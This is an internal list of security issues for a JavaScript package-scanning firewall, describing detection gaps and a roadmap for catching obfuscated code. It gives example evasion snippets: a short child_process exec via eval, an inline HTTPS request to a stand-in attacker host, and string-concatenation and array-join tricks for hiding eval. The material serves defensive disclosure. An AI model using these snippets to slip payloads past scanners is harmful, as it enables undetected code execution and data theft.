# Issues to open post-publish

Open these as GitHub issues after the v0.1.0 tag is pushed. They track
the pre-existing MEDIUM findings and the next meaningful roadmap step.

---

## Issue 1 — Sub-100B behavioral bypass (MEDIUM)

**Title:** `[Security] Behavioral scanner skips modules < 100 bytes`

**Body:**

The behavioral scanner (`src/behavior-tracker.js:96`) returns an empty result for
any module shorter than 100 bytes:

```js
if (!content || content.length < 100) return [];
```

A malicious payload consisting entirely of a single dangerous action under 100 bytes
(e.g., a 60-byte `eval(require("child_process").exec("id"))`) evades the behavioral
pass entirely. Signature scanning still applies to all non-empty modules, so any
payload matching a known signature is still caught.

**Impact:** Behavioral-only detections (CREDENTIAL_EXFILTRATION, DYNAMIC_CODE_EXEC_CHAIN,
etc.) do not fire on sub-100B modules. A novel payload not matching any signature and
under 100 bytes would not be detected.

**Fix:** Remove or lower the size guard. The guard was an early optimization; with
the F-01 sub-512B scan-skip already removed, there is no longer a principled reason
to keep a 100B floor. Removing it requires editing `src/behavior-tracker.js` and
regenerating `.helios-baseline`.

**Labels:** security, behavioral-detection, engine

---

## Issue 2 — Inline-require NETWORK_EGRESS behavioral miss (MEDIUM)

**Title:** `[Security] Inline require("https").get(...) does not match NETWORK_EGRESS behavioral pattern`

**Body:**

The behavioral scanner's NETWORK_EGRESS regex expects:

```
/https\s*\.\s*get\s*\(/
```

This matches `https.get(` (variable reference) but not `require("https").get(`
(inline require, no separate assignment). The following payload triggers no
behavioral NETWORK_EGRESS event:

```js
require("https").get({ hostname: "attacker.example.com" });
```

Signature scanning does not catch this either (the signature `https.request` does
not match `https").get`).

**Impact:** A module that reads credentials AND makes an outbound request using only
the inline-require pattern evades CREDENTIAL_EXFILTRATION behavioral detection.

**Fix:** Extend the NETWORK_EGRESS regex to also match inline-require patterns:
```
/(?:require\(["']https["']\)|https)\s*(?:\.\s*(?:get|request)\s*\()/
```
Requires editing `src/behavior-tracker.js` and regenerating `.helios-baseline`.

**Labels:** security, behavioral-detection, engine

---

## Issue 3 — AST-level analysis for obfuscation-resistant detection (Phase 5)

**Title:** `[Roadmap] Phase 5: AST-level analysis for obfuscation-resistant detection`

**Body:**

The current firewall's documented bypasses all require dynamic or AST-level analysis:

| Bypass | Technique |
|--------|-----------|
| `this["ev"+"al"]` | String concatenation in bracket notation |
| `global["ev"+"al"]` | Global bracket notation |
| `["ch","ild"].join("")` | Array-join obfuscation |
| `eval.constructor` | Prototype chain traversal |

All four bypass the Aho-Corasick signature scanner (which looks for literal strings)
and the behavioral regex state machine (which matches source text patterns).

**Proposed approach:** Integrate a lightweight AST pass using Node.js's built-in
`vm` module or a zero-dependency parser to detect:
- Property access via bracket notation on string literals that concatenate to dangerous identifiers
- `Array.prototype.join` calls on arrays of string fragments that spell dangerous identifiers
- Prototype chain traversal patterns (`eval.constructor`, `Function.prototype.call`, etc.)

This is Phase 5 on the roadmap. It will require engine file changes and baseline regeneration.

**Acceptance criteria:**
- [ ] Bracket eval `this["ev"+"al"]` is detected and blocked
- [ ] String concat `global["ev"+"al"]` is detected and blocked
- [ ] Array join `["ch","ild"].join("")` is detected and blocked
- [ ] Prototype chain `eval.constructor` is detected and blocked
- [ ] Adversarial test suite extended to cover all 4 patterns
- [ ] Median gate overhead remains < 25%
- [ ] `.helios-baseline` regenerated

**Labels:** enhancement, roadmap, phase-5, engine
